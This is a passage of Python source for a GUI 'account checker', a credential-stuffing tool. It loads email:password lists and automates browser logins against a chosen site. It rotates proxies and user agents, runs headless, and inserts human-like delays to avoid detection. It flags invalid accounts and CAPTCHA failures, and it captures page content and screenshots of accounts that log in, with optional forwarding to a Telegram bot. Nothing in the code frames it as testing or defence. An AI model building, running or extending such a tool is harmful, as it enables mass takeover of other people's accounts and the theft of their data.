                for frame in css_click_frames:
                    selector = frame["selector_entry"].get().strip()
                    num_clicks = frame["num_clicks_entry"].get().strip()
                    interval = frame["interval_entry"].get().strip()
                    if selector and num_clicks and interval:
                        css_clicks.append((selector, num_clicks, interval))
                    else:
                        print_action(
                            f"{Fore.YELLOW}Incomplete CSS click data; skipping this CSS click action.{Style.RESET_ALL}"
                        )

            check_account(
                account,
                browser_instance,
                website_link,
                valid_link,
                db_name,
                custom_valid_link,
                results_folder,
                capture_settings,
                sleep_durations,
                invalid_account_settings,
                captcha_wrong_settings,
            )

        except Exception as e:
            print_action(
                f"{Fore.RED}Unexpected error for account {email}: {e}{Style.RESET_ALL}"
            )

        finally:
            close_browser_instance()

        # Small delay between accounts to mimic human behavior
        time.sleep(2)


def run_account_checks(
    usernames_and_passwords,
    website_target_link,
    website_valid_link,
    db_name,
    custom_valid_link,
    results_folder,
    user_data_dir,
    profile_name,
    capture_settings,
    sleep_durations,
    proxy_enabled,
    proxy_type,
    proxy_mode,
    custom_user_agents,
    load_extensions,
    disable_notifications,
    disable_infobars,
    start_maximized,
    disable_extensions_option,
    headless,
    chromedriver_args,
    invalid_account_settings,
    captcha_wrong_settings,
    proxies,
):
    """Runs the account checking process in a separate thread."""
    try:
        check_accounts_logic(
            usernames_and_passwords,
            website_target_link,
            website_valid_link,
            db_name,
            custom_valid_link,
            results_folder,
            user_data_dir,
            profile_name,
            capture_settings,
            sleep_durations,
            proxy_enabled,
            proxy_type,
            proxy_mode,
            custom_user_agents,
            load_extensions,
            disable_notifications,
            disable_infobars,
            start_maximized,
            disable_extensions_option,
            headless,
            chromedriver_args,
            invalid_account_settings,
            captcha_wrong_settings,
            proxies,  # Added proxies here
        )

        messagebox.showinfo(
            "Process Completed", "Account checking process has completed."
        )

    except Exception as e:
        print_action(
            f"{Fore.RED}An error occurred during account checking: {e}{Style.RESET_ALL}"
        )
        messagebox.showerror("Error", f"An error occurred: {e}")

    finally:
        # Re-enable the Check Accounts button
        btn_check_accounts.config(state=tk.NORMAL)

        # Reset pause and stop events
        pause_event.clear()
        stop_event.clear()

        btn_pause_resume.config(text="Pause")
        btn_force_stop.config(state=tk.DISABLED)


# -------------------
# GUI Functions
# -------------------
entry_placeholders = {'Enter value here...', 'Enter redirect link here...', 'Enter argument here...'}


def get_entry_value(entry):
    value = entry.get().strip()
    if value in entry_placeholders:
        return ''
    else:
        return value

def gui_check_accounts():
    """Modified to handle both methods."""
    if var_method_type.get() == "Method 2" and not selected_directory.get():
        messagebox.showerror("Error", "Please select a directory for Method 2")
        return

    """Handles the Check Accounts button click."""
    website_target_link = get_entry_value(entry_website_target_link)
    website_valid_link = get_entry_value(entry_website_valid_link)
    redirect_url = get_entry_value(entry_redirect_link)
    custom_valid_link = redirect_url  # Use redirect URL as custom valid link if needed

    if not website_target_link:
        messagebox.showerror("Input Error", "Website Target Link is required.")
        return

    css_selectors = {
        "email": get_entry_value(entry_css_selector_email),
        "password": get_entry_value(entry_css_selector_password),
        "submit": get_entry_value(entry_css_selector_submit),
        "next": get_entry_value(entry_css_selector_next_button) or None,
    }

    # Validate required CSS selectors
    if not css_selectors["email"] or not css_selectors["password"] or not css_selectors["submit"]:
        messagebox.showerror("Input Error", "Email, Password, and Submit CSS selectors are required.")
        return

    # Get Capture Settings
    capture_settings = {
        "css_selectors": {},
        "inner_html_capture": var_inner_html_capture.get(),
        "outer_html_capture": var_outer_html_capture.get(),
        "redirect_link": redirect_url if redirect_url else None,
        "cleanup_enabled": var_cleanup_enabled.get(),
        "telegram": {
            "enabled": var_telegram_enabled.get(),
            "bot_token": capture_telegram_bot_token.get().strip(),
            "chat_id": capture_telegram_chat_id.get().strip(),
        },
        "speed_percentage": 500,  # Default speed percentage
        "incognito_mode": var_incognito_mode.get(),
        "css_selectors": css_selectors,
    }

    # Collect CSS Selectors from Capture Settings
    for frame in capture_css_selector_frames:
        selector = frame["selector_entry"].get().strip()
        key = frame["key_entry"].get().strip()
        if key in entry_placeholders:
            key = ''
        if selector in entry_placeholders:
            selector = ''
        if selector and key:
            capture_settings["css_selectors"][key] = selector

    # Collect Sleep Durations
    try:
        sleep_email = float(entry_sleep_email.get())
        sleep_password = float(entry_sleep_password.get())
        sleep_submit = float(entry_sleep_submit.get())

        if not (0 <= sleep_email <= 100 and 0 <= sleep_password <= 100 and 0 <= sleep_submit <= 100):
            messagebox.showerror(
                "Invalid Sleep Duration",
                "Sleep durations must be between 0 and 100 seconds.",
            )
            return
    except ValueError:
        messagebox.showerror(
            "Invalid Sleep Duration", "Please enter valid numbers for sleep durations."
        )
        return

    sleep_durations = {
        "sleep_email": sleep_email,
        "sleep_password": sleep_password,
        "sleep_submit": sleep_submit,
    }

    # Get usernames and passwords
    usernames_and_passwords = []
    raw_accounts = text_usernames_passwords.get("1.0", tk.END).strip().split("\n")
    for line in raw_accounts:
        if line:
            parts = line.strip().split(":")
            if len(parts) == 2:
                email, password = parts
                if not account_already_checked((email, password), db_name):
                    usernames_and_passwords.append((email, password))
            else:
                print_action(
                    f"{Fore.YELLOW}Invalid account format skipped: {line}{Style.RESET_ALL}"
                )

    if not usernames_and_passwords:
        messagebox.showinfo("No Accounts", "No new accounts to check.")
        return

    # Create results folder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_folder = os.path.join(os.getcwd(), f"results_{timestamp}")
    os.makedirs(results_folder, exist_ok=True)
    print_action(
        f"{Fore.CYAN}Results will be saved in: {results_folder}{Style.RESET_ALL}"
    )

    # Disable the Check Accounts button to prevent multiple runs
    btn_check_accounts.config(state=tk.DISABLED)
    btn_force_stop.config(state=tk.NORMAL)

    # Gather additional settings
    proxy_enabled = var_proxy_enabled.get()
    proxy_type = proxy_type_var.get()
    proxy_mode = proxy_mode_var.get()
    load_extensions = var_load_extensions.get()
    disable_notifications = var_disable_notifications.get()
    disable_infobars = var_disable_infobars.get()
    start_maximized = var_start_maximized.get()
    disable_extensions_option = var_disable_extensions_option.get()
    headless = var_headless.get()
    use_custom_user_agents = var_custom_user_agents.get()
    custom_user_agents = None
    proxies_list = proxies.copy()
    chromedriver_args_to_use = chromedriver_args_list.copy()  # Use a copy to prevent modification

    # Handle Custom User Agents
    if use_custom_user_agents:
        if not custom_user_agents_file:
            messagebox.showerror(
                "User Agents Error", "Custom User Agents file not selected."
            )
            btn_check_accounts.config(state=tk.NORMAL)
            btn_force_stop.config(state=tk.DISABLED)
            return
        try:
            with open(custom_user_agents_file, "r", encoding='utf-8') as f:
                custom_user_agents = [line.strip() for line in f if line.strip()]
            if not custom_user_agents:
                messagebox.showerror(
                    "User Agents Error", "Custom User Agents file is empty."
                )
                btn_check_accounts.config(state=tk.NORMAL)
                btn_force_stop.config(state=tk.DISABLED)
                return
            print_action(
                f"{Fore.GREEN}Custom User Agents loaded successfully.{Style.RESET_ALL}"
            )
        except Exception as e:
            messagebox.showerror(
                "User Agents Error", f"Failed to read user agents file: {e}"
            )
            btn_check_accounts.config(state=tk.NORMAL)
            btn_force_stop.config(state=tk.DISABLED)
            return

    # Handle Invalid Account Implementation
    invalid_account_settings = {
        "enable": var_invalid_account_enabled.get(),
        "redirect_detection": get_entry_value(entry_invalid_redirect),
        "error_alert_css_selector": get_entry_value(entry_invalid_error_selector),
        "inner_html": get_entry_value(entry_invalid_inner_html),
        "outer_html": get_entry_value(entry_invalid_outer_html),
    }

    # Handle CAPTCHA Input Wrong Implementation
    captcha_wrong_settings = {
        "enable": var_captcha_wrong_enabled.get(),
        "redirect_detection": get_entry_value(entry_captcha_redirect),
        "error_alert_css_selector": get_entry_value(entry_captcha_error_selector),
        "inner_html": get_entry_value(entry_captcha_inner_html),
        "outer_html": get_entry_value(entry_captcha_outer_html),
    }

    # Start the account checking in a new thread
    threading.Thread(
        target=run_account_checks,
        args=(
            usernames_and_passwords,
            website_target_link,
            website_valid_link,
            db_name,
            custom_valid_link,
            results_folder,
            user_data_dir,
            profile_name,
            capture_settings,
            sleep_durations,
            proxy_enabled,
            proxy_type,
            proxy_mode,
            custom_user_agents,
            load_extensions,
            disable_notifications,
            disable_infobars,
            start_maximized,
            disable_extensions_option,
            headless,
            chromedriver_args_to_use,
            invalid_account_settings,
            captcha_wrong_settings,
            proxies_list,
        ),
        daemon=True,
    ).start()


def import_proxies_from_file():
    """Imports proxies from a selected file."""
    global proxies  # Use the global list 'proxies'
    file_path = filedialog.askopenfilename(
        initialdir=os.getcwd(),
        title="Select Proxy File",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        with open(file_path, "r", encoding='utf-8') as file:
            proxies.clear()
            for line in file:
                proxy_line = line.strip()
                # Handle proxies with or without authentication
                if "@" in proxy_line:
                    # Format: username:password@ip:port
                    proxies.append(proxy_line)  # Keep the complete proxy string
                else:
                    # Format: ip:port
                    proxies.append(proxy_line)
        if proxies:
            print_action(
                f"{Fore.GREEN}Proxies imported successfully from {file_path}.{Style.RESET_ALL}"
            )
        else:
            print_action(
                f"{Fore.RED}No valid proxies found in {file_path}.{Style.RESET_ALL}"
            )
    else:
        print_action(f"{Fore.RED}No file selected for proxies.{Style.RESET_ALL}")


def select_user_agents_file():
    """Allows the user to select a user agents TXT file."""
    global custom_user_agents_file
    file_path = filedialog.askopenfilename(
        initialdir=os.getcwd(),
        title="Select User Agents File",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        custom_user_agents_file = file_path
        print_action(
            f"{Fore.GREEN}User Agents file selected: {file_path}{Style.RESET_ALL}"
        )
    else:
        print_action(f"{Fore.RED}No User Agents file selected.{Style.RESET_ALL}")


def create_config():
    """Opens a window for creating a new config file."""
    global config_file_path

    def save_config():
        global config_file_path
        config_name = entry_config_name.get().strip()
        if not config_name:
            messagebox.showerror("Input Error", "Please enter a config file name.")
            return
        file_path = filedialog.asksaveasfilename(
            initialdir=os.getcwd(),
            initialfile=config_name,
            defaultextension=".txt",
            filetypes=(("Text Files", "*.txt"),),
        )
        if file_path:
            config_file_path = file_path
            config_window.destroy()
            messagebox.showinfo(
                "Config Saved", f"Configuration saved to {file_path}"
            )
            save_config_data(config_file_path)  # Save the config data to the file

    config_window = tk.Toplevel(window)
    config_window.title("Create New Config")
    config_window.geometry("400x150")

    ttk.Label(
        config_window,
        text="Enter a name for the new config file (e.g., 'my_config.txt'):",
    ).pack(padx=10, pady=10)
    entry_config_name = ttk.Entry(config_window, width=40)
    entry_config_name.pack(padx=10, pady=5)

    ttk.Button(config_window, text="Save Config", command=save_config).pack(pady=10)


def import_config():
    """Opens a window for importing an existing config file."""
    global config_file_path
    file_path = filedialog.askopenfilename(
        initialdir=os.getcwd(),
        title="Import Config",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        config_file_path = file_path
        try:
            load_config_data(
                file_path,
                entry_website_target_link,
                entry_website_valid_link,
                entry_css_selector_email,
                entry_css_selector_password,
                entry_css_selector_submit,
                entry_sleep_submit,
                entry_css_selector_next_button,
                entry_sleep_email,
                entry_invalid_redirect,
                entry_invalid_error_selector,
                entry_invalid_inner_html,
                entry_invalid_outer_html,
                entry_captcha_redirect,
                entry_captcha_error_selector,
                entry_captcha_inner_html,
                entry_captcha_outer_html,
                entry_redirect_link,
                # Capture Settings
                var_inner_html_capture,
                var_outer_html_capture,
                var_telegram_enabled,
                capture_telegram_bot_token,
                capture_telegram_chat_id,
                # Capture CSS Selectors
                capture_css_selector_frames,
            )
            messagebox.showinfo(
                "Config Imported",
                f"Configuration imported from {file_path}",
            )
        except Exception as e:
            print_action(
                f"{Fore.RED}An error occurred while importing config: {e}{Style.RESET_ALL}"
            )
            messagebox.showerror(
                "Import Error", f"An error occurred while importing config: {e}"
            )


def export_config():
    """Opens a window for exporting the current config file."""
    global config_file_path
    file_path = filedialog.asksaveasfilename(
        initialdir=os.getcwd(),
        defaultextension=".txt",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        config_file_path = file_path
        try:
            save_config_data(config_file_path)
            messagebox.showinfo(
                "Config Exported",
                f"Configuration exported to {file_path}",
            )
        except Exception as e:
            print_action(
                f"{Fore.RED}An error occurred while exporting config: {e}{Style.RESET_ALL}"
            )
            messagebox.showerror(
                "Export Error", f"An error occurred while exporting config: {e}"
            )


def save_config_state():
    """Saves the current state of the config to a file."""
    global config_file_path

    if not config_file_path:
        create_config()  # Prompt user to create a config file if none exists
        return

    if config_file_path:
        try:
            save_config_data(config_file_path)
            print_action(
                f"{Fore.GREEN}Config state saved to: {config_file_path}{Style.RESET_ALL}"
            )
        except Exception as e:
            print_action(
                f"{Fore.RED}An error occurred while saving config state: {e}{Style.RESET_ALL}"
            )
            messagebox.showerror(
                "Save Error", f"An error occurred while saving config state: {e}"
            )


def load_config_data(
    file_path,
    entry_website_target_link,
    entry_website_valid_link,
    entry_css_selector_email,
    entry_css_selector_password,
    entry_css_selector_submit,
    entry_sleep_submit,
    entry_css_selector_next_button,
    entry_sleep_email,
    entry_invalid_redirect,
    entry_invalid_error_selector,
    entry_invalid_inner_html,
    entry_invalid_outer_html,
    entry_captcha_redirect,
    entry_captcha_error_selector,
    entry_captcha_inner_html,
    entry_captcha_outer_html,
    entry_redirect_link,
    # Capture Settings
    var_inner_html_capture,
    var_outer_html_capture,
    var_telegram_enabled,
    capture_telegram_bot_token,
    capture_telegram_chat_id,
    # Capture CSS Selectors
    capture_css_selector_frames,
):
    """Loads config data from a file."""
    try:
        with open(file_path, "r", encoding='utf-8') as file:
            lines = file.readlines()
            current_css_selector_key = None
            for line in lines:
                parts = line.strip().split("=", 1)
                if len(parts) == 2:  # Ensure each line has key=value format
                    key, value = parts
                    if key == "website_target_link":
                        entry_website_target_link.delete(0, tk.END)
                        entry_website_target_link.insert(0, value)
                    elif key == "website_valid_link":
                        entry_website_valid_link.delete(0, tk.END)
                        entry_website_valid_link.insert(0, value)
                    elif key == "redirect_url":
                        entry_redirect_link.delete(0, tk.END)
                        entry_redirect_link.insert(0, value)
                    elif key == "css_selector_email":
                        entry_css_selector_email.delete(0, tk.END)
                        entry_css_selector_email.insert(0, value)
                    elif key == "css_selector_password":
                        entry_css_selector_password.delete(0, tk.END)
                        entry_css_selector_password.insert(0, value)
                    elif key == "css_selector_submit":
                        entry_css_selector_submit.delete(0, tk.END)
                        entry_css_selector_submit.insert(0, value)
                    elif key == "sleep_submit":
                        entry_sleep_submit.delete(0, tk.END)
                        entry_sleep_submit.insert(0, value)
                    elif key == "css_selector_next_button":
                        entry_css_selector_next_button.delete(0, tk.END)
                        entry_css_selector_next_button.insert(0, value)
                    elif key == "sleep_email":
                        entry_sleep_email.delete(0, tk.END)
                        entry_sleep_email.insert(0, value)
                    elif key == "invalid_redirect":
                        entry_invalid_redirect.delete(0, tk.END)
                        entry_invalid_redirect.insert(0, value)
                    elif key == "invalid_error_selector":
                        entry_invalid_error_selector.delete(0, tk.END)
                        entry_invalid_error_selector.insert(0, value)
                    elif key == "invalid_inner_html":
                        entry_invalid_inner_html.delete(0, tk.END)
                        entry_invalid_inner_html.insert(0, value)
                    elif key == "invalid_outer_html":
                        entry_invalid_outer_html.delete(0, tk.END)
                        entry_invalid_outer_html.insert(0, value)
                    elif key == "captcha_redirect":
                        entry_captcha_redirect.delete(0, tk.END)
                        entry_captcha_redirect.insert(0, value)
                    elif key == "captcha_error_selector":
                        entry_captcha_error_selector.delete(0, tk.END)
                        entry_captcha_error_selector.insert(0, value)
                    elif key == "captcha_inner_html":
                        entry_captcha_inner_html.delete(0, tk.END)
                        entry_captcha_inner_html.insert(0, value)
                    elif key == "captcha_outer_html":
                        entry_captcha_outer_html.delete(0, tk.END)
                        entry_captcha_outer_html.insert(0, value)
                    elif key == "redirect_link":
                        entry_redirect_link.delete(0, tk.END)
                        entry_redirect_link.insert(0, value)
                    elif key == "inner_html_capture":
                        var_inner_html_capture.set(value.lower() == "true")
                    elif key == "outer_html_capture":
                        var_outer_html_capture.set(value.lower() == "true")
                    elif key == "telegram_enabled":
                        var_telegram_enabled.set(value.lower() == "true")
                    elif key == "telegram_bot_token":
                        capture_telegram_bot_token.set(value)
                    elif key == "telegram_chat_id":
                        capture_telegram_chat_id.set(value)
                    elif key.startswith("css_selector_key_"):
                        current_css_selector_key = value
                    elif key.startswith("css_selector_"):
                        if current_css_selector_key:
                            selector = value
                            add_capture_css_selector_frame(
                                key=current_css_selector_key,
                                selector=selector,
                                load=True,
                            )
                            current_css_selector_key = None

        print_action(
            f"{Fore.GREEN}Configuration loaded successfully from {file_path}.{Style.RESET_ALL}"
        )
    except FileNotFoundError:
        print_action(f"{Fore.RED}Config file not found: {file_path}{Style.RESET_ALL}")
        messagebox.showerror("Load Error", f"Config file not found: {file_path}")
    except ValueError:
        print_action(
            f"{Fore.RED}Error loading config file: {file_path}. Make sure it's in the correct format (key=value).{Style.RESET_ALL}"
        )
        messagebox.showerror(
            "Load Error",
            f"Error loading config file: {file_path}. Make sure it's in the correct format (key=value).",
        )
    except Exception as e:
        print_action(
            f"{Fore.RED}An unexpected error occurred while loading config: {e}{Style.RESET_ALL}"
        )
        messagebox.showerror(
            "Load Error", f"An unexpected error occurred while loading config: {e}"
        )


def save_config_data(file_path):
    """Saves config data to a file."""
    try:
        with open(file_path, "w", encoding='utf-8') as file:
            file.write(f"website_target_link={entry_website_target_link.get()}\n")
            file.write(f"website_valid_link={entry_website_valid_link.get()}\n")
            file.write(f"redirect_url={entry_redirect_link.get()}\n")
            file.write(f"css_selector_email={entry_css_selector_email.get()}\n")
            file.write(f"sleep_email={entry_sleep_email.get()}\n")
            file.write(f"css_selector_password={entry_css_selector_password.get()}\n")
            file.write(f"sleep_password={entry_sleep_password.get()}\n")
            file.write(f"css_selector_submit={entry_css_selector_submit.get()}\n")
            file.write(f"sleep_submit={entry_sleep_submit.get()}\n")
            file.write(
                f"css_selector_next_button={entry_css_selector_next_button.get()}\n"
            )
            file.write(f"invalid_redirect={entry_invalid_redirect.get()}\n")
            file.write(
                f"invalid_error_selector={entry_invalid_error_selector.get()}\n"
            )
            file.write(f"invalid_inner_html={entry_invalid_inner_html.get()}\n")
            file.write(f"invalid_outer_html={entry_invalid_outer_html.get()}\n")
            file.write(f"captcha_redirect={entry_captcha_redirect.get()}\n")
            file.write(
                f"captcha_error_selector={entry_captcha_error_selector.get()}\n"
            )
            file.write(f"captcha_inner_html={entry_captcha_inner_html.get()}\n")
            file.write(f"captcha_outer_html={entry_captcha_outer_html.get()}\n")
            file.write(f"redirect_link={entry_redirect_link.get()}\n")
            # Capture Settings
            file.write(f"inner_html_capture={var_inner_html_capture.get()}\n")
            file.write(f"outer_html_capture={var_outer_html_capture.get()}\n")
            file.write(f"telegram_enabled={var_telegram_enabled.get()}\n")
            file.write(
                f"telegram_bot_token={capture_telegram_bot_token.get().strip()}\n"
            )
            file.write(f"telegram_chat_id={capture_telegram_chat_id.get().strip()}\n")
            # Capture CSS Selectors
            for idx, frame in enumerate(capture_css_selector_frames, start=1):
                key = frame["key_entry"].get().strip()
                selector = frame["selector_entry"].get().strip()
                if key and selector:
                    file.write(f"css_selector_key_{idx}={key}\n")
                    file.write(f"css_selector_{idx}={selector}\n")
        print_action(f"{Fore.GREEN}Configuration saved to {file_path}.{Style.RESET_ALL}")
    except Exception as e:
        print_action(f"{Fore.RED}Failed to save configuration: {e}{Style.RESET_ALL}")
        messagebox.showerror("Save Error", f"Failed to save configuration: {e}")


def reset_to_default():
    """Resets all GUI entries to their default values."""
    entry_website_target_link.delete(0, tk.END)
    entry_website_target_link.insert(0, "Enter value here...")
    entry_website_target_link.config(foreground="grey")

    entry_website_valid_link.delete(0, tk.END)
    entry_website_valid_link.insert(0, "Enter value here...")
    entry_website_valid_link.config(foreground="grey")

    entry_redirect_link.delete(0, tk.END)
    entry_redirect_link.insert(0, "Enter redirect link here...")
    entry_redirect_link.config(foreground="grey")

    entry_css_selector_email.delete(0, tk.END)
    entry_css_selector_email.insert(0, "Enter value here...")
    entry_css_selector_email.config(foreground="grey")

    entry_css_selector_password.delete(0, tk.END)
    entry_css_selector_password.insert(0, "Enter value here...")
    entry_css_selector_password.config(foreground="grey")

    entry_css_selector_submit.delete(0, tk.END)
    entry_css_selector_submit.insert(0, "Enter value here...")
    entry_css_selector_submit.config(foreground="grey")

    entry_css_selector_next_button.delete(0, tk.END)
    entry_css_selector_next_button.insert(0, "Enter value here...")
    entry_css_selector_next_button.config(foreground="grey")

    # Reset Sleep Durations
    entry_sleep_email.delete(0, tk.END)
    entry_sleep_email.insert(0, "25")  # Default sleep email

    entry_sleep_password.delete(0, tk.END)
    entry_sleep_password.insert(0, "25")  # Default sleep password

    entry_sleep_submit.delete(0, tk.END)
    entry_sleep_submit.insert(0, "25")  # Default sleep submit

    # Reset Invalid Account Fields
    entry_invalid_redirect.delete(0, tk.END)
    entry_invalid_redirect.insert(0, "Enter value here...")
    entry_invalid_redirect.config(foreground="grey")

    entry_invalid_error_selector.delete(0, tk.END)
    entry_invalid_error_selector.insert(0, "Enter value here...")
    entry_invalid_error_selector.config(foreground="grey")

    entry_invalid_inner_html.delete(0, tk.END)
    entry_invalid_inner_html.insert(0, "Enter value here...")
    entry_invalid_inner_html.config(foreground="grey")

    entry_invalid_outer_html.delete(0, tk.END)
    entry_invalid_outer_html.insert(0, "Enter value here...")
    entry_invalid_outer_html.config(foreground="grey")

    # Reset CAPTCHA Wrong Fields
    entry_captcha_redirect.delete(0, tk.END)
    entry_captcha_redirect.insert(0, "Enter value here...")
    entry_captcha_redirect.config(foreground="grey")

    entry_captcha_error_selector.delete(0, tk.END)
    entry_captcha_error_selector.insert(0, "Enter value here...")
    entry_captcha_error_selector.config(foreground="grey")

    entry_captcha_inner_html.delete(0, tk.END)
    entry_captcha_inner_html.insert(0, "Enter value here...")
    entry_captcha_inner_html.config(foreground="grey")

    entry_captcha_outer_html.delete(0, tk.END)
    entry_captcha_outer_html.insert(0, "Enter value here...")
    entry_captcha_outer_html.config(foreground="grey")

    # Reset Redirect Link
    entry_redirect_link.delete(0, tk.END)
    entry_redirect_link.insert(0, "Enter redirect link here...")
    entry_redirect_link.config(foreground="grey")

    # Reset Capture Settings
    var_inner_html_capture.set(False)
    var_outer_html_capture.set(False)
    var_telegram_enabled.set(False)
    capture_telegram_bot_token.set("")
    capture_telegram_chat_id.set("")

    # Reset Capture CSS Selectors
    for frame in capture_css_selector_frames:
        frame["frame"].destroy()
    capture_css_selector_frames.clear()

    # Add a default capture CSS selector frame
    add_capture_css_selector_frame()

    var_proxy_enabled.set(False)  # Reset proxy toggle
    var_load_extensions.set(False)  # Reset load extensions toggle
    var_disable_notifications.set(False)  # Reset disable notifications
    var_disable_infobars.set(False)  # Reset disable infobars
    var_start_maximized.set(False)  # Reset start maximized
    var_disable_extensions_option.set(False)  # Reset disable extensions option
    var_headless.set(False)  # Reset headless option
    var_custom_user_agents.set(False)  # Reset custom user agents toggle
    var_enable_mouse_clicks.set(False)  # Reset mouse clicks toggle
    var_incognito_mode.set(False)  # Reset incognito mode toggle
    var_invalid_account_enabled.set(False)  # Reset Invalid Account toggle
    var_captcha_wrong_enabled.set(False)  # Reset CAPTCHA Wrong toggle
    var_use_database.set(True)  # Reset database toggle to default ON
    var_capture_screenshot.set(True)  # Reset screenshot capture to default ON

    # Reset Mouse Click Frames
    for frame in mouse_click_frames:
        frame["x_entry"].delete(0, tk.END)
        frame["y_entry"].delete(0, tk.END)
        frame["num_clicks_entry"].delete(0, tk.END)
        frame["interval_entry"].delete(0, tk.END)
        frame["frame"].destroy()

    for frame in css_click_frames:
        frame["selector_entry"].delete(0, tk.END)
        frame["num_clicks_entry"].delete(0, tk.END)
        frame["interval_entry"].delete(0, tk.END)
        frame["frame"].destroy()

    # Reset Chromedriver Arguments
    chromedriver_args_list.clear()
    listbox_chromedriver_args.delete(0, tk.END)

    messagebox.showinfo("Reset", "All fields have been reset to default.")

    # Clear mouse click frames list
    mouse_click_frames.clear()
    css_click_frames.clear()


# -------------------
# Capture Settings Functions
# -------------------
capture_css_selector_frames = []


def add_capture_css_selector_frame(key="", selector="", load=False):
    """Adds a new CSS selector frame in Capture Settings."""
    frame = ttk.Frame(frame_capture_css_selectors)
    frame.pack(padx=10, pady=5, fill="x")

    ttk.Label(frame, text="Key Name:").grid(
        column=0, row=0, padx=5, pady=2, sticky="e"
    )
    key_entry = ttk.Entry(frame, width=20)
    key_entry.grid(column=1, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        key_entry, "Enter a unique key name for the CSS selector (e.g., Username)."
    )

    ttk.Label(frame, text="CSS Selector:").grid(
        column=2, row=0, padx=5, pady=2, sticky="e"
    )
    selector_entry = ttk.Entry(frame, width=50)
    selector_entry.grid(column=3, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(selector_entry, "Enter the CSS selector for the element.")

    remove_button = ttk.Button(
        frame, text="-", command=lambda f=frame: remove_capture_css_selector_frame(f)
    )
    remove_button.grid(column=4, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        remove_button,
        "Remove this CSS selector entry.",
    )

    if load:
        key_entry.insert(0, key)
        selector_entry.insert(0, selector)

    capture_css_selector_frames.append(
        {
            "frame": frame,
            "key_entry": key_entry,
            "selector_entry": selector_entry,
        }
    )


def remove_capture_css_selector_frame(frame):
    """Removes a CSS selector frame from Capture Settings."""
    for css_frame in capture_css_selector_frames:
        if css_frame["frame"] == frame:
            css_frame["frame"].destroy()
            capture_css_selector_frames.remove(css_frame)
    if not capture_css_selector_frames:
        add_capture_css_selector_frame()


def add_capture_settings():
    """Initializes capture settings with default CSS selector."""
    add_capture_css_selector_frame()


# -------------------
# Mouse Click Automation Functions
# -------------------
def add_mouse_click_action_extended():
    """Adds a new mouse click action frame."""
    frame = ttk.Frame(frame_mouse_clicks)
    frame.pack(padx=10, pady=5, fill="x")

    ttk.Label(frame, text="X:").grid(column=0, row=0, padx=5, pady=2, sticky="e")
    x_entry = ttk.Entry(frame, width=10)
    x_entry.grid(column=1, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        x_entry, "Enter the X coordinate for the click location."
    )

    ttk.Label(frame, text="Y:").grid(column=2, row=0, padx=5, pady=2, sticky="e")
    y_entry = ttk.Entry(frame, width=10)
    y_entry.grid(column=3, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        y_entry, "Enter the Y coordinate for the click location."
    )

    ttk.Label(frame, text="Number of Clicks:").grid(
        column=4, row=0, padx=5, pady=2, sticky="e"
    )
    num_clicks_entry = ttk.Entry(frame, width=10)
    num_clicks_entry.grid(column=5, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        num_clicks_entry,
        "Enter how many times to click at this location during one account check.",
    )

    ttk.Label(frame, text="Time Interval (s):").grid(
        column=6, row=0, padx=5, pady=2, sticky="e"
    )
    interval_entry = ttk.Entry(frame, width=10)
    interval_entry.grid(column=7, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        interval_entry, "Enter the interval in seconds between each click."
    )

    remove_button = ttk.Button(
        frame,
        text="-",
        command=lambda f=frame: remove_mouse_click_action_extended(f),
    )
    remove_button.grid(column=8, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(remove_button, "Remove this click action.")

    # Store references for retrieval
    mouse_click_frames.append(
        {
            "frame": frame,
            "x_entry": x_entry,
            "y_entry": y_entry,
            "num_clicks_entry": num_clicks_entry,
            "interval_entry": interval_entry,
        }
    )


def remove_mouse_click_action_extended(frame):
    """Removes a mouse click action frame."""
    for click_frame in mouse_click_frames:
        if click_frame["frame"] == frame:
            click_frame["frame"].destroy()
            mouse_click_frames.remove(click_frame)
            break
    if not mouse_click_frames:
        add_mouse_click_action_extended()


def add_css_click_action():
    """Adds a new CSS Selector click action frame."""
    frame = ttk.Frame(frame_css_clicks)
    frame.pack(padx=10, pady=5, fill="x")

    ttk.Label(frame, text="CSS Selector:").grid(column=0, row=0, padx=5, pady=2, sticky="e")
    selector_entry = ttk.Entry(frame, width=50)
    selector_entry.grid(column=1, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        selector_entry, "Enter the CSS selector for the element to click."
    )

    ttk.Label(frame, text="Number of Clicks:").grid(
        column=2, row=0, padx=5, pady=2, sticky="e"
    )
    num_clicks_entry = ttk.Entry(frame, width=10)
    num_clicks_entry.grid(column=3, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        num_clicks_entry,
        "Enter how many times to click this element during one account check.",
    )

    ttk.Label(frame, text="Time Interval (s):").grid(
        column=4, row=0, padx=5, pady=2, sticky="e"
    )
    interval_entry = ttk.Entry(frame, width=10)
    interval_entry.grid(column=5, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        interval_entry, "Enter the interval in seconds between each click."
    )

    remove_button = ttk.Button(
        frame,
        text="-",
        command=lambda f=frame: remove_css_click_action(f),
    )
    remove_button.grid(column=6, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(remove_button, "Remove this CSS click action.")

    # Store references for retrieval
    css_click_frames.append(
        {
            "frame": frame,
            "selector_entry": selector_entry,
            "num_clicks_entry": num_clicks_entry,
            "interval_entry": interval_entry,
        }
    )


def remove_css_click_action(frame):
    """Removes a CSS click action frame."""
    for click_frame in css_click_frames:
        if click_frame["frame"] == frame:
            click_frame["frame"].destroy()
            css_click_frames.remove(click_frame)
            break
    if not css_click_frames:
        add_css_click_action()


# -------------------
# Pause/Resume and Force Stop Functions
# -------------------
def pause_resume():
    """Pauses or resumes the account checking process."""
    if not pause_event.is_set():
        pause_event.set()
        btn_pause_resume.config(text="Resume")
        print_action(f"{Fore.YELLOW}Script paused.{Style.RESET_ALL}")
    else:
        pause_event.clear()
        btn_pause_resume.config(text="Pause")
        print_action(f"{Fore.GREEN}Script resumed.{Style.RESET_ALL}")


def force_stop():
